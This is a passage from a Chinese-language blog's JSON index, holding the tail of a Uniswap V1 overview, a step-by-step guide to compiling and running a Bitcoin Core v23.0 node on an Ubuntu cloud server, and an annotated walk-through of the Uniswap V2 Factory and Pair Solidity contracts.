的优点\n去中心化交易Uniswap V1 实现了去中心化交易，用户可以直接与智能合约交互进行交易，无需信任任何中介机构。\n\n无需许可任何人都可以通过提供流动性或进行交易来参与 Uniswap，无需注册或身份验证。\n\n无摩擦交易交易不依赖传统的买卖订单簿，而是通过 AMM 模型直接与流动性池进行交互，简化了交易流程，减少了摩擦。\n\n支持 ERC-20 代币Uniswap V1 支持所有 ERC-20 代币，使得它成为一个灵活的去中心化交易平台，支持多种资产之间的交易。\n\n\n总结Uniswap V1 是一个创新的去中心化自动化做市商（AMM）协议，通过智能合约为用户提供了简单、高效且无需许可的交易方式。它的核心优势在于去中心化、简化交易流程、以及流动性提供者通过交易手续费获得奖励。然而，Uniswap V1 也存在一些局限性，例如价格失真和滑点问题，这些问题在后续的版本（如 V2 和 V3）中得到了改进。\nUniswap V1 为去中心化交易所（DEX）和去中心化金融（DeFi）应用的发展奠定了基础，是目前最广泛使用的去中心化交易协议之一。\n","categories":["Uniswap"],"tags":["basement"]},{"title":"从零开始在云服务器上搭建比特币测试区块链-Chapter1","url":"/2024/11/29/BitcoinCore-Build-C1/","content":"Chapter1-从源码编译构建比特币核心节点\n最近在实验课中接触到了这方面的相关教程，但我发现我们老师所发的教程手册中有很多没有提到的内容，所以在这里开了一篇文章来详细介绍一下\n其实在实际操作中遇到最多的是报错&#x2F;运行不能&#x2F;网络错误等问题，这些我看教程里都没有提到，所以我个人进行了一些简单的补充，主要内容还是以原教程为主\n并且由于这部分的内容较多，我将分成几个部分来讲，这篇文章先讲述如何从源码编译构建比特币核心节点\n\n1. 云服务器的获取这一步就没什么好说的，随便找个华为云&#x2F;腾讯云&#x2F;阿里云的服务器就行，可以用免费试用（毕竟只是测试使用），注意云服务器的系统使用linux的ubuntn\n2. 构建Bitcoin Core核心节点(1). 使用git命令行在系统上创建Bitcoin Core源代码的本地副本先使用 sudo apt-get install git 命令在虚拟机上安装git，再git clone一下bitcoin的github仓库地址\ngit clone https://github.com/bitcoin/bitcoin.git\n\n\n这一步经常出现网络差（github通病）拉取失败的报错，可以在github.com前再加上一个gitclone.com解决\n\n\n(2).使用git命令查看并checkout对应的Bitcoin Core版本**克隆仓库完成后进入bitcoin文件夹，可以使用 git tag命令 查看比特币版本信息\n\n我们这里选择v23.0版本进行后续操作\ngit checkout v23.0\n\n通过命令git status来确认当前源代码的版本信息\n(3).配置构建Bitcoin Core系统\n在Ubuntu Linux中配置与编译Bitcoin Core系统前，可以使用apt安装所需的依赖库。\n\nsudo apt-get updatesudo apt-get install autoconfsudo apt-get install libtoolsudo apt-get install makesudo apt-get install gcc sudo apt-get install g++sudo apt-get install libdb-devsudo apt-get install libdb++-devsudo apt-get install aptitudesudo aptitude install libboost-all-devsudo apt-get install zlib1g-devsudo apt-get install libssl-devsudo apt-get install build-essentialsudo apt-get install libminiupnpc-devsudo apt-get install libevent-devsudo apt-get install sqlite sqlite3sudo apt-get install libsqlite3-devsudo apt-get install pkg-config\n\n安装途中会不断弹出是否要继续安装的选项，一直输入Y（yes）就行\n\n使用.&#x2F;autogen.sh脚本生成一组build 脚本来启动build过程\n\n\n以下是一些常用的选项，可以覆盖configure脚本的默认行为： \n–prefix&#x3D;$HOME 这将覆盖生成的可执行文件的默认安装位置（Linux系统默认是&#x2F; usr &#x2F; local &#x2F;）。 可以使用$ HOME将所有内容放在用户的主目录或不同的路径中。 \n–enable-wallet 用于启用钱包功能。\n–disable-wallet 用于禁用钱包功能。 \n–without-bdb 钱包不使用已不推荐使用的Berkeley DB数据库。\n–with-sqlite 钱包使用SQLite数据库。 \n–with-gui&#x3D;no 不要构建图形用户界面，图形界面需要Qt库，只构建服务器和命令行。\n\n输入下面这串命令确认依赖已经全部安装成功\n./configure --with-gui=no --enable-wallet --without-bdb --with-sqlite=yes\n\n*如果一切顺利，configure命令将会以创建可定制的构建脚本结束。这些构建脚本允许编译bitcoind。如果有缺失的库或是错误，configure命令将会以错误信息终止。如果出现了错误，可能是因为缺少库或是有不兼容的库。 重新检查构建文档，确认你已经安装缺失的必备条件，然后运行configure，看看错误是否消失了。*\n\n(4).构建Bitcoin Core系统可执行文件这一步将编译源代码，这个过程根据CPU和内存资源不同，但一般可能需要1个小时完成。在编译的过程中，应该过几秒或是几分钟看一下输出结果。如果出现了问题，会看到错误信息。如果中断了，编译的过程可以在任何时候恢复。\nmake\n\n\n这一步确实要编译很久，根据网络和虚拟机配置不同有较大的差异，耐心等待即可\nsudo make install \n\n上一步完成后，通过sudo make install 命令，安装 bitcoind 可执行文件到Linux系统路径下\n\n最后再检查一下bitcoin是否安装成功\n\n出现这样的提示就是成功了\n（5）运行Bitcoin Core系统节点\n首先用vi编辑器配置一下config\n\n这里配置的时候一直遇到一些小问题，比如无法读取无法写入文件等报错，经过查询后发现可能是权限的限制，我们只需要在每条指令前加上sudo（管理员权限执行） 即可解决\nsudo vi bitcoin.conf\n\n输入这行命令后就会进入vi编辑器 在vi编辑器中按I是进入insert（插入）模式，可以修改conf配置文件的内容，按esc是退出插入模式。我们先进入插入模式粘贴如下的配置信息\nserver=1  # 接收命令行与JSON-RPC访问txindex=1rpcuser = bitcoinrpc #这里填用户名，一般是rootrpcpassword = bitcoinrpc #这里填写你设置的密码\n\n退出编辑模式之后，使用**:wq**退出配置文件\n确认配置文件无误后，使用下面的命令启动比特币主网络全节点\nbitcoind -conf=/data/bitcoin.conf -datadir=/data\n\n\n注意，这一步最好是新开一个tmux会话运行，因为我最开始直接在主控制台中拉取，但是后面信息太多根本停止不了，会直接让小内存的云服务器爆内存（）\n新开tmux会话的命令 tmux new -t bitcoind\n输入这行命令后，在新出现的会话窗口中输入上面的命令，确认拉取成功后按ctrl+b再按d即可回到主终端\n\n\n拉取主网络节点成功后，随时可以输入\nsudo bitcoin-cli -conf=/data/bitcoin.conf stop #停止节点的拉取\n\n\n使用bitcoin-cli命令监视比特币节点的进度和运行状态\nsudo bitcoin-cli -conf=/data/bitcoin.conf getblockchaininfo\n\n\n总结这篇文章中我简单演示了一下在本地（云服务器）拉取比特币主网络，并构建和运行bitcoin core系统的过程，这也是我们做后续操作所需要的前置条件，下篇文章我将给大家演示如何通过命令行调用比特币系统的JSON-RPC API接口\n","categories":["Bitcoin Core"],"tags":["basement"]},{"title":"Uniswap V2核心代码简析","url":"/2024/12/02/Uniswap-V2/","content":"Uniswap V2核心代码简析\n前言：本篇文章我将对Uniswap V2相较于V1的一些升级做出总结，并且根据github上的Uniswap V2源码进行一些中文的注释，注释参考了UniswapV2_Chinese&#x2F;v2-core at master · kpyaoqi&#x2F;UniswapV2_Chinese\n\n(1).Uniswap V2 相较于V1的优势1. 支持任意代币对\nV1 仅支持以 ETH 为中介的交易对（即每个交易对必须包含 ETH），无法直接交换两种 ERC-20 代币。0\nV2 允许任何两种 ERC-20 代币直接交易，不需要通过 ETH 作为中介，这提高了灵活性并减少了交易步骤。\n\n2. 引入了时间加权平均价格（TWAP）\nV1 没有内置的价格预言机制，依赖外部数据源。\nV2 引入了时间加权平均价格（TWAP），可以通过计算一定时间窗口内的价格平均值，作为价格数据的来源。这一功能不仅提供了价格保护，还能减少短期市场波动对价格的影响。\n\n3. 提供闪电交换（Flash Swap）\nV1 没有提供类似功能。\nV2 引入了闪电交换功能，允许用户在交易开始时无需预先提供资金，完成交易后才结算。用户可以通过这种机制进行套利、借贷等操作。\n\n4. 改进的手续费机制\nV1 的手续费为 0.3%，且不可调节。\nV2 依旧保持 0.3% 的手续费，但协议引入了更灵活的机制，允许调整某些方面的费用结构，进一步提升了协议的可扩展性和适应性。\n\n5. 支持更复杂的交易逻辑\nV2 支持通过合约执行更复杂的交易逻辑，比如支持智能合约中的多代币交换、套利等操作，这使得它可以被集成进更多的金融工具和应用。\n\n6. 安全性增强\nV2 引入了更多的安全措施，尤其是防重入攻击机制。关键的合约函数（如 swap、mint 和 burn）都使用了锁（lock）机制，避免了可能的重入攻击。\n还进行了 Gas 优化，减少了不必要的存储读取，提升了交易效率。\n\nV2 的优势总结\n更高的灵活性：支持任意两种 ERC-20 代币交易，取消了 ETH 作为中介的限制。\n价格预言功能：引入了 TWAP，更加安全和稳定的价格获取方式。\n创新的闪电交换：支持用户无需预先资金即可执行复杂的交易逻辑，增加了协议的可用性。\n更强的安全性：防重入攻击和 Gas 优化使得协议在安全性和性能上都有提升。\n更高效的交易：减少了交易成本和复杂性，使交易变得更加高效和用户友好。\n\n\n(2).Uniswap V2的核心特点\nUniswap V2是一种基于以太坊的去中心化交易协议，旨在提供快速、安全、无信任的代币交换服务。它是Uniswap协议的第二个版本，是对第一个版本的改进和升级。\n\nUniswap V2的核心特点包括以下几个方面：\n去中心化交易：Uniswap V2使用智能合约来执行交易，而不需要传统的中心化交易所。这意味着用户可以直接通过他们的以太坊钱包进行交易，无需信任或依赖第三方中介。\n自动化做市商模型：Uniswap V2采用自动化做市商模型，其中流动性提供者可以将资金存入流动性池中，并通过提供资金来帮助形成交易对的市场价格。这种模型使得任何人都可以成为流动性提供者，并从交易手续费中获得奖励。\n常量乘积函数：Uniswap V2使用常量乘积函数作为交易价格计算模型。根据这个函数，交易所需的两种代币的数量乘积在交易前后保持不变，从而决定了交易价格。这种机制可以在没有订单簿的情况下进行交易，并保持相对简单和高效。\nERC-20代币支持：Uniswap V2支持以太坊上的ERC-20代币进行交易。用户可以通过选择不同的代币对进行交易，并且任何人都可以创建新的代币对，只需提供相应的流动性即可。\n流动性挖矿：Uniswap V2引入了流动性挖矿机制，通过奖励流动性提供者来吸引更多的资金注入流动性池。流动性提供者可以获得代币奖励作为对其提供流动性的补偿，如果市场价格剧烈波动，您存入的资金可能面临损失。\n\n\n(3).Uniswap V2源码注解–UniswapV2Factory\n先贴一下源码\n\npragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;./UniswapV2Pair.sol&#x27;;contract UniswapV2Factory is IUniswapV2Factory &#123;    address public feeTo;    //function feeTo() external view returns (address)：返回收取手续费地址        address public feeToSetter;    //function feeToSetter() external view returns (address)：设置手续费收取地址的权限地址    mapping(address =&gt; mapping(address =&gt; address)) public getPair;     //function getPair(address tokenA, address tokenB) external view returns (address pair)：获取两个token的交易对地址         address[] public allPairs;     //function allPairs(uint) external view returns (address pair)：返回指定位置的交易对地址         event PairCreated(address indexed token0, address indexed token1, address pair, uint);    constructor(address _feeToSetter) public &#123;        feeToSetter = _feeToSetter;    &#125;    function allPairsLength() external view returns (uint) &#123;        return allPairs.length;        //function allPairsLength() external view returns (uint)：返回所有交易对的长度    &#125;    function createPair(address tokenA, address tokenB) external returns (address pair) &#123;    //function createPair(address tokenA, address tokenB) external returns (address pair)：创建两个token的交易对地址        require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;);        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);        require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;);        require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient        bytes memory bytecode = type(UniswapV2Pair).creationCode;        bytes32 salt = keccak256(abi.encodePacked(token0, token1));        assembly &#123;        \t//add(bytecode, 32)：opcode操作码的add方法,将bytecode偏移后32位字节处,因为前32位字节存的是bytecode长度\t\t\t//mload(bytecode)：opcode操作码的方法,获得bytecode长度            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)        &#125;        IUniswapV2Pair(pair).initialize(token0, token1);        getPair[token0][token1] = pair;        getPair[token1][token0] = pair; // populate mapping in the reverse direction        allPairs.push(pair);        emit PairCreated(token0, token1, pair, allPairs.length);    &#125;    function setFeeTo(address _feeTo) external &#123;        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);        feeTo = _feeTo;        //function setFeeTo(address) external：更改收取手续费地址    &#125;    function setFeeToSetter(address _feeToSetter) external &#123;        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);        feeToSetter = _feeToSetter;        //function setFeeToSetter(address) external：更改设置手续费收取地址的权限地址    &#125;&#125;\n\n\n上述合约中的每个方法后面都跟上了方法的目的，现在让我们单独来看这段代码\nbytes32 salt = keccak256(abi.encodePacked(token0, token1));//-1bytes memory bytecode = type(UniswapV2Pair).creationCode;//-2assembly &#123;\t//add(bytecode, 32)：opcode操作码的add方法,将bytecode偏移后32位字节处,因为前32位字节存的是bytecode长度\t//mload(bytecode)：opcode操作码的方法,获得bytecode长度\tpair := create2(0, add(bytecode, 32), mload(bytecode), salt)&#125;//-3\n\n\n这段代码使用了 Solidity 的 create2 操作来部署一个智能合约(UniswapV2Pair-交易对合约)，并且采用了 keccak256 哈希函数来生成一个唯一的 salt。salt 是基于 token0 和 token1 这两个代币地址组合生成的。keccak256 是一种常用的加密哈希算法，生成的 32 字节值（bytes32 类型）将作为 create2 操作的盐值。\n\n这一行获取 UniswapV2Pair 合约的 字节码，也就是合约的创建代码。type(UniswapV2Pair).creationCode 获取 UniswapV2Pair 合约的字节码，UniswapV2Pair 是 Uniswap 中定义交易对（pair）的合约。\nbytecode 变量将包含该合约的构造代码（即部署时的合约代码），它将被用来部署新的 UniswapV2Pair 合约。\n\n这一部分使用了 Solidity 中的 低级 assembly 来执行合约的部署。\n\nadd(bytecode, 32)：由于字节码的前 32 字节存储的是字节码的长度，所以 add(bytecode, 32) 将字节码的位置偏移 32 字节，确保我们获得的是字节码本身，而不是字节码长度。\n\nmload(bytecode)：该操作会返回存储在 bytecode 地址中的第一个 32 字节（即字节码的长度）。\n\ncreate2 是一个低级操作码，用来根据 salt 和字节码部署一个新的合约。\n\n\n\n\n\n它的参数如下：\n0：这是部署合约时传递的以太坊余额。这里是 0，意味着不向新合约发送以太坊。\nadd(bytecode, 32)：字节码的地址（偏移了 32 字节）。\nmload(bytecode)：字节码的长度。\nsalt：前面生成的盐值，这里是基于 token0 和 token1 地址计算得到的哈希值。\n\n\n\n\n\ncreate2 的作用是根据提供的字节码和盐值来确定合约地址，从而在部署合约时保证合约地址的唯一性。即通过盐值与字节码计算生成合约地址，并在相同的输入条件下，每次都能部署到相同的地址。\ncreate2 可以避免在多个合约部署过程中产生冲突，特别是在合约地址已知的情况下，可以确保合约地址的可预测性。这在一些 DeFi 协议中非常有用，比如 Uniswap 使用 create2 部署交易对合约（UniswapV2Pair），这样每对代币的交易对合约地址都是唯一且可预测的。\n\nassembly-内联汇编：在 Solidity 源程序中嵌入汇编代码，对 EVM 有更细粒度的控制\n\n\n(4).Uniswap V2源码注解–UniswapV2Pair\n还是先在这里贴一下源码\npragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2Pair.sol&#x27;;import &#x27;./UniswapV2ERC20.sol&#x27;;import &#x27;./libraries/Math.sol&#x27;;import &#x27;./libraries/UQ112x112.sol&#x27;;import &#x27;./interfaces/IERC20.sol&#x27;;import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;./interfaces/IUniswapV2Callee.sol&#x27;;contract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 &#123;    using SafeMath  for uint;    using UQ112x112 for uint224;    uint public constant MINIMUM_LIQUIDITY = 10**3;    bytes4 private constant SELECTOR = bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;)));    address public factory;    address public token0;    address public token1;    uint112 private reserve0;           // uses single storage slot, accessible via getReserves    uint112 private reserve1;           // uses single storage slot, accessible via getReserves    uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves    uint public price0CumulativeLast;    uint public price1CumulativeLast;    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event    uint private unlocked = 1;    modifier lock() &#123;        require(unlocked == 1, &#x27;UniswapV2: LOCKED&#x27;);        unlocked = 0;        _;        unlocked = 1;    &#125;    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) &#123;        _reserve0 = reserve0;        _reserve1 = reserve1;        _blockTimestampLast = blockTimestampLast;    &#125;    function _safeTransfer(address token, address to, uint value) private &#123;        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));        require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), &#x27;UniswapV2: TRANSFER_FAILED&#x27;);    &#125;    event Mint(address indexed sender, uint amount0, uint amount1);    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);    event Swap(        address indexed sender,        uint amount0In,        uint amount1In,        uint amount0Out,        uint amount1Out,        address indexed to    );    event Sync(uint112 reserve0, uint112 reserve1);    constructor() public &#123;        factory = msg.sender;    &#125;    // called once by the factory at time of deployment    function initialize(address _token0, address _token1) external &#123;        require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check        token0 = _token0;        token1 = _token1;    &#125;    // update reserves and, on the first call per block, price accumulators    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;        require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), &#x27;UniswapV2: OVERFLOW&#x27;);        uint32 blockTimestamp = uint32(block.timestamp % 2**32);        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired        if (timeElapsed &gt; 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;            // * never overflows, and + overflow is desired            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;        &#125;        reserve0 = uint112(balance0);        reserve1 = uint112(balance1);        blockTimestampLast = blockTimestamp;        emit Sync(reserve0, reserve1);    &#125;    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;        address feeTo = IUniswapV2Factory(factory).feeTo();        feeOn = feeTo != address(0);        uint _kLast = kLast; // gas savings        if (feeOn) &#123;            if (_kLast != 0) &#123;                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));                uint rootKLast = Math.sqrt(_kLast);                if (rootK &gt; rootKLast) &#123;                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));                    uint denominator = rootK.mul(5).add(rootKLast);                    uint liquidity = numerator / denominator;                    if (liquidity &gt; 0) _mint(feeTo, liquidity);                &#125;            &#125;        &#125; else if (_kLast != 0) &#123;            kLast = 0;        &#125;    &#125;    // this low-level function should be called from a contract which performs important safety checks    function mint(address to) external lock returns (uint liquidity) &#123;        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings        uint balance0 = IERC20(token0).balanceOf(address(this));        uint balance1 = IERC20(token1).balanceOf(address(this));        uint amount0 = balance0.sub(_reserve0);        uint amount1 = balance1.sub(_reserve1);        bool feeOn = _mintFee(_reserve0, _reserve1);        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee        if (_totalSupply == 0) &#123;            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens        &#125; else &#123;            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);        &#125;        require(liquidity &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&#x27;);        _mint(to, liquidity);        _update(balance0, balance1, _reserve0, _reserve1);        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date        emit Mint(msg.sender, amount0, amount1);    &#125;    // this low-level function should be called from a contract which performs important safety checks    function burn(address to) external lock returns (uint amount0, uint amount1) &#123;        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings        address _token0 = token0;                                // gas savings        address _token1 = token1;                                // gas savings        uint balance0 = IERC20(_token0).balanceOf(address(this));        uint balance1 = IERC20(_token1).balanceOf(address(this));        uint liquidity = balanceOf[address(this)];        bool feeOn = _mintFee(_reserve0, _reserve1);        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution        require(amount0 &gt; 0 &amp;&amp; amount1 &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&#x27;);        _burn(address(this), liquidity);        _safeTransfer(_token0, to, amount0);        _safeTransfer(_token1, to, amount1);        balance0 = IERC20(_token0).balanceOf(address(this));        balance1 = IERC20(_token1).balanceOf(address(this));        _update(balance0, balance1, _reserve0, _reserve1);        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date        emit Burn(msg.sender, amount0, amount1, to);    &#125;    // this low-level function should be called from a contract which performs important safety checks    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;        require(amount0Out &gt; 0 || amount1Out &gt; 0, &#x27;UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings        require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY&#x27;);        uint balance0;        uint balance1;        &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors        address _token0 = token0;        address _token1 = token1;        require(to != _token0 &amp;&amp; to != _token1, &#x27;UniswapV2: INVALID_TO&#x27;);        if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens        if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens        if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);        balance0 = IERC20(_token0).balanceOf(address(this));        balance1 = IERC20(_token1).balanceOf(address(this));        &#125;        uint amount0In = balance0 &gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;        uint amount1In = balance1 &gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;        require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;UniswapV2: INSUFFICIENT_INPUT_AMOUNT&#x27;);        &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));        require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(1000**2), &#x27;UniswapV2: K&#x27;);        &#125;        _update(balance0, balance1, _reserve0, _reserve1);        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);    &#125;    // force balances to match reserves    function skim(address to) external lock &#123;        address _token0 = token0; // gas savings        address _token1 = token1; // gas savings        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));    &#125;    // force reserves to match balances    function sync() external lock &#123;        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);    &#125;&#125;\n\n由于源码太长，注释我就单独拆开写了\n\n合约当中比较重要的方法有(lptoken即UniswapV2ERC20):\nfunction permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external：判断签名的有效性\n\nfunction mint(address to) external returns (uint liquidity)：铸造lptoken\n\nfunction burn(address to) external returns (uint amount0, uint amount1)：销毁lptoken退出流动性\n\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external：根据tokenA的数量在交易池中进行兑换tokenB\n\nfunction skim(address to) external：使两个token的余额与储备相等\n\nfunction sync() external：使两个token的储备与余额相匹配\n\nfunction initialize(address, address) external：设置pair地址交易对的两种token\n\n\n[1].permit:(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s)// ecrecover 函数可以返回与签名者对应的公钥地址address recoveredAddress = ecrecover(digest, v, r, s);// 判断签名者对应的公钥地址与授权地址是否一致require(recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner, &#x27;UniswapV2: INVALID_SIGNATURE&#x27;);_approve(owner, spender, value);\n\n判断数字签名的有效性，如果通过判断即给予授权\n[2].mint：(address to) lock returns (uint liquidity)// 1.获取进行添加流动性的两个token的数量(uint112 _reserve0, uint112 _reserve1, ) = getReserves();uint balance0 = IERC20(token0).balanceOf(address(this));uint balance1 = IERC20(token1).balanceOf(address(this));uint amount0 = balance0.sub(_reserve0);uint amount1 = balance1.sub(_reserve1);// 2.调用_mintFee方法// 3.添加流动性所获得的lptoken数量(进行添加流动性的两种token的数量*目前lptoken的数量/当前token的储备量--&gt;取较小值)liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);// 4.铸造lptoken函数和更新储备函数_mint(to, liquidity);_update(balance0, balance1, _reserve0, _reserve1);\n\n根据两个token在交易对的增量计算出应该铸造lptoken的数量，然后将lptoken铸造给to地址，具有防重入锁lock\n","categories":["Uniswap"],"tags":["basement"]}]